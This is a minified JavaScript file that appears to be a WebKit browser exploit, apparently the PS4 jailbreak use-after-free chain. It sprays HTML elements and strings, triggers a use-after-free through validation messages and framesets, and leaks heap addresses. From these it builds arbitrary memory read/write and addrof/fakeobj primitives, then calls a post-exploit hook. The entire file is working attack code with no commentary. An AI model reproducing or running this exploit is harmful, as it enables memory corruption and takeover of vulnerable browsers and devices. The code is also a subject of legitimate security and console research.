const OFFSET_ELEMENT_REFCOUNT = 16,
    OFFSET_JSAB_VIEW_VECTOR = 16,
    OFFSET_JSAB_VIEW_LENGTH = 24,
    OFFSET_LENGTH_STRINGIMPL = 4,
    OFFSET_HTMLELEMENT_REFCOUNT = 20,
    LENGTH_ARRAYBUFFER = 8,
    LENGTH_STRINGIMPL = 20,
    LENGTH_JSVIEW = 32,
    LENGTH_VALIDATION_MESSAGE = 48,
    LENGTH_TIMER = 72,
    LENGTH_HTMLTEXTAREA = 216,
    SPRAY_ELEM_SIZE = 24576,
    SPRAY_STRINGIMPL = 4096,
    NB_FRAMES = 4e3,
    NB_REUSE = 32768;
var g_arr_ab_1 = [],
    g_arr_ab_2 = [],
    g_arr_ab_3 = [],
    g_frames = [],
    g_relative_read = null,
    g_relative_rw = null,
    g_ab_slave = null,
    g_ab_index = null,
    g_timer_leak = null,
    g_jsview_leak = null,
    g_jsview_butterfly = null,
    g_message_heading_leak = null,
    g_message_body_leak = null,
    g_textarea_div_elem = null,
    g_obj_str = {},
    g_rows1 = "1px,".repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px",
    g_rows2 = "2px,".repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px",
    g_round = 1,
    g_input = null,
    guess_htmltextarea_addr = new Int64("0x2031b00d8");
function setupRW() {
    for (let e = 0; e < g_arr_ab_3.length; e++)
        if (255 < g_arr_ab_3[e].length) {
            (g_relative_rw = g_arr_ab_3[e]), debug_log(".");
            break;
        }
    null === g_relative_rw && die("[!] Failed to setup a relative R/W primitive"), debug_log(".");
    var e = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1,
        e = new Int64(str2array(g_relative_read, 8, e + OFFSET_JSAB_VIEW_VECTOR)),
        e = g_jsview_leak.sub(e).low32();
    (g_ab_index = g_relative_rw[e + LENGTH_JSVIEW + OFFSET_JSAB_VIEW_LENGTH] === LENGTH_ARRAYBUFFER ? e + LENGTH_JSVIEW : e - LENGTH_JSVIEW), (g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 65);
    for (let e = 0; e < g_arr_ab_3.length; e++)
        if (65 === g_arr_ab_3[e].length) {
            (g_ab_slave = g_arr_ab_3[e]), (g_arr_ab_3 = null);
            break;
        }
    null === g_ab_slave && die("[!] Didn't found the slave JSArrayBufferView"),
        (g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 255),
        (g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 1] = 255),
        (g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 2] = 255),
        (g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 255),
        debug_log(".");
    e = read64(guess_htmltextarea_addr);
    write64(guess_htmltextarea_addr, new Int64("0x4141414141414141")),
        read64(guess_htmltextarea_addr).equals("0x4141414141414141") || die("[!] Failed to setup arbitrary R/W primitive"),
        debug_log("."),
        write64(guess_htmltextarea_addr, e),
        cleanup(),
        (g_ab_slave.leakme = 4919);
    for (var _ = 0, r = 15; 8 <= r; r--) _ = 256 * _ + g_relative_rw[g_ab_index + r];
    read64((g_jsview_butterfly = new Int64(_)).sub(16)).equals(new Int64("0xffff000000001337")) || die("[!] Failed to setup addrof/fakeobj primitives"), debug_log("."), window.postExploit && window.postExploit();
}
function read(_, r) {
    for (let e = 0; e < 8; e++) g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + e] = _.byteAt(e);
    let a = [];
    for (let e = 0; e < r; e++) a.push(g_ab_slave[e]);
    return a;
}
function read64(e) {
    return new Int64(read(e, 8));
}
function write(_, r) {
    for (let e = 0; e < 8; e++) g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + e] = _.byteAt(e);
    for (let e = 0; e < r.length; e++) g_ab_slave[e] = r[e];
}
function write64(e, _) {
    write(e, _.bytes());
}
function addrof(e) {
    return (g_ab_slave.leakme = e), read64(g_jsview_butterfly.sub(16));
}
function fakeobj(e) {
    return write64(g_jsview_butterfly.sub(16), e), g_ab_slave.leakme;
}
function cleanup() {
    select1.remove(), (select1 = null), input1.remove(), (input1 = null), input2.remove(), (input2 = null), input3.remove(), (input3 = null), div1.remove(), (div1 = null), (g_frames = g_rows2 = g_rows1 = g_input = null);
}
function confuseTargetObjRound2() {
    !1 === findTargetObj() && die("[!] Failed to reuse target obj."), (g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble()), setTimeout(setupRW, 6e3);
}
function leakJSC() {
    debug_log(".");
    var _ = Object.getOwnPropertyNames(g_obj_str);
    for (let e = _.length - 1; 0 < e; e--)
        if (255 < _[e].length) {
            debug_log("."), (g_relative_read = _[e]), (g_obj_str = null);
            break;
        }
    null === g_relative_read && die("[!] Failed to setup a relative read primitive"), debug_log(".");
    for (var e = {}, r = 0; r < 1e5; r++) e["Z".repeat(123 - LENGTH_STRINGIMPL) + ("" + r).padStart(5, "0")] = 4919;
    var a = new ArrayBuffer(LENGTH_ARRAYBUFFER);
    let t = [];
    for (let e = 0; e < 65536; e++) (64512 <= e ? g_arr_ab_3 : t).push(new Uint8Array(a));
    t = null;
    for (var l = [], r = 0; r < 1024; r++) l.push({ value: 1111638594 }), l.push({ value: g_arr_ab_3[r] });
    for (; null === g_jsview_leak; ) {
        Object.defineProperties({}, l);
        for (let e = 0; e < 8388608; e++) {
            var i = void 0;
            if (
                (66 === g_relative_read.charCodeAt(e) &&
                    66 === g_relative_read.charCodeAt(e + 1) &&
                    66 === g_relative_read.charCodeAt(e + 2) &&
                    66 === g_relative_read.charCodeAt(e + 3) &&
                    (0 === g_relative_read.charCodeAt(e + 8) &&
                    0 === g_relative_read.charCodeAt(e + 15) &&
                    0 === g_relative_read.charCodeAt(e + 16) &&
                    0 === g_relative_read.charCodeAt(e + 23) &&
                    14 === g_relative_read.charCodeAt(e + 24) &&
                    0 === g_relative_read.charCodeAt(e + 31) &&
                    0 === g_relative_read.charCodeAt(e + 40) &&
                    0 === g_relative_read.charCodeAt(e + 47) &&
                    0 === g_relative_read.charCodeAt(e + 48) &&
                    0 === g_relative_read.charCodeAt(e + 55) &&
                    14 === g_relative_read.charCodeAt(e + 56) &&
                    0 === g_relative_read.charCodeAt(e + 63)
                        ? (i = new Int64(str2array(g_relative_read, 8, e + 32)))
                        : 66 === g_relative_read.charCodeAt(e + 16) &&
                          66 === g_relative_read.charCodeAt(e + 17) &&
                          66 === g_relative_read.charCodeAt(e + 18) &&
                          66 === g_relative_read.charCodeAt(e + 19) &&
                          (i = new Int64(str2array(g_relative_read, 8, e + 8)))),
                void 0 !== i && i.greater(g_timer_leak) && 0 === i.sub(g_timer_leak).hi32())
            ) {
                (g_jsview_leak = i), (l = null);
                break;
            }
        }
    }
    debug_log("."), prepareUAF();
}
function confuseTargetObjRound1() {
    sprayStringImpl(SPRAY_STRINGIMPL, 2 * SPRAY_STRINGIMPL),
        !1 === findTargetObj() && die("[!] Failed to reuse target obj."),
        dumpTargetObj(),
        (g_fake_validation_message[4] = g_timer_leak.add(8 * LENGTH_TIMER + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble()),
        setTimeout(leakJSC, 6e3);
}
function handle2() {
    input2.focus();
}
function reuseTargetObj() {
    document.body.appendChild(g_input);
    for (let e = NB_FRAMES / 2 - 16; e < NB_FRAMES / 2 + 16; e++) g_frames[e].setAttribute("rows", ",");
    for (let e = 0; e < NB_REUSE; e++) {
        var _ = new ArrayBuffer(LENGTH_VALIDATION_MESSAGE);
        let e = new Float64Array(_);
        (e[0] = guess_htmltextarea_addr.asDouble()), (e[3] = guess_htmltextarea_addr.asDouble()), g_arr_ab_1.push(e);
    }
    1 == g_round ? (sprayStringImpl(0, SPRAY_STRINGIMPL), (g_frames = []), (g_round += 1), (g_input = input3), setTimeout(confuseTargetObjRound1, 10)) : setTimeout(confuseTargetObjRound2, 10);
}
function dumpTargetObj() {
    debug_log("."), debug_log("."), debug_log(".");
}
function findTargetObj() {
    for (let e = 0; e < g_arr_ab_1.length; e++)
        if (!Int64.fromDouble(g_arr_ab_1[e][2]).equals(Int64.Zero))
            return (
                debug_log("."),
                2 === g_round && ((g_timer_leak = Int64.fromDouble(g_arr_ab_1[e][2])), (g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[e][4])), (g_message_body_leak = Int64.fromDouble(g_arr_ab_1[e][5])), g_round++),
                (g_fake_validation_message = g_arr_ab_1[e]),
                (g_arr_ab_1 = []),
                !0
            );
    return !1;
}
function prepareUAF() {
    g_input.setCustomValidity("ps4");
    for (let e = 0; e < NB_FRAMES; e++) {
        var _ = document.createElement("frameset");
        g_frames.push(_);
    }
    g_input.reportValidity();
    var e = document.createElement("div");
    document.body.appendChild(e), e.appendChild(g_input);
    for (let e = 0; e < NB_FRAMES / 2; e++) g_frames[e].setAttribute("rows", g_rows1);
    g_input.reportValidity();
    for (let e = NB_FRAMES / 2; e < NB_FRAMES; e++) g_frames[e].setAttribute("rows", g_rows2);
    g_input.setAttribute("onfocus", "reuseTargetObj()"), (g_input.autofocus = !0);
}
function sprayHTMLTextArea() {
    debug_log(".");
    let _ = (g_textarea_div_elem = document.createElement("div"));
    document.body.appendChild(_), (_.id = "div1");
    var r = document.createElement("textarea");
    r.style.cssText = "display:block-inline;height:1px;width:1px;visibility:hidden;";
    for (let e = 0; e < SPRAY_ELEM_SIZE; e++) _.appendChild(r.cloneNode());
}
function sprayStringImpl(_, r) {
    for (let e = _; e < r; e++) {
        var a = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 5) + e.toString().padStart(5, "0"));
        g_obj_str[a] = 4919;
    }
}
function go() {
    localStorage.isCached && (sprayHTMLTextArea(), window.midExploit && window.midExploit(), (g_input = input1), prepareUAF());
}
